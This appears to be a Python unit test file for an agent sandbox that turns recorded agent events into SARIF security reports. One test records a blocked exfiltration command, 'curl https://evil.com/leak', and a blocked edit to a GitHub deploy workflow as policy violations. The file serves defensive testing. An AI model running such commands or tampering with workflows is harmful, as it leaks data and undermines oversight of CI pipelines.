import json
import tempfile
import unittest
from pathlib import Path
from agent_sandbox.merkle import MerkleDAG
from agent_sandbox.sarif import generate_sarif_report


class TestSarifReport(unittest.TestCase):
    def test_sarif_report_empty_violations(self):
        dag = MerkleDAG()
        dag.record_event("command", "git status", "clean", 0)
        receipt = dag.generate_receipt()

        sarif = generate_sarif_report(receipt)
        self.assertEqual(sarif["version"], "2.1.0")
        self.assertEqual(len(sarif["runs"]), 1)
        self.assertEqual(len(sarif["runs"][0]["results"]), 0)

    def test_sarif_report_with_violations(self):
        dag = MerkleDAG()
        dag.record_event("policy_block", "curl https://evil.com/leak", "blocked", 126, is_violation=True)
        dag.record_event("policy_block", ".github/workflows/deploy.yml", "blocked", 126, is_violation=True)
        receipt = dag.generate_receipt()

        with tempfile.NamedTemporaryFile("w", suffix=".sarif", delete=False) as f:
            sarif = generate_sarif_report(receipt, output_path=f.name)
            temp_path = f.name

        try:
            results = sarif["runs"][0]["results"]
            self.assertEqual(len(results), 2)
            self.assertEqual(results[0]["ruleId"], "AS004")  # Secret / exfil / curl
            self.assertEqual(results[1]["ruleId"], "AS003")  # Workflow tampering
            
            # Verify file exists and is valid json
            saved = json.loads(Path(temp_path).read_text(encoding="utf-8"))
            self.assertEqual(saved["version"], "2.1.0")
        finally:
            Path(temp_path).unlink(missing_ok=True)


if __name__ == "__main__":
    unittest.main()
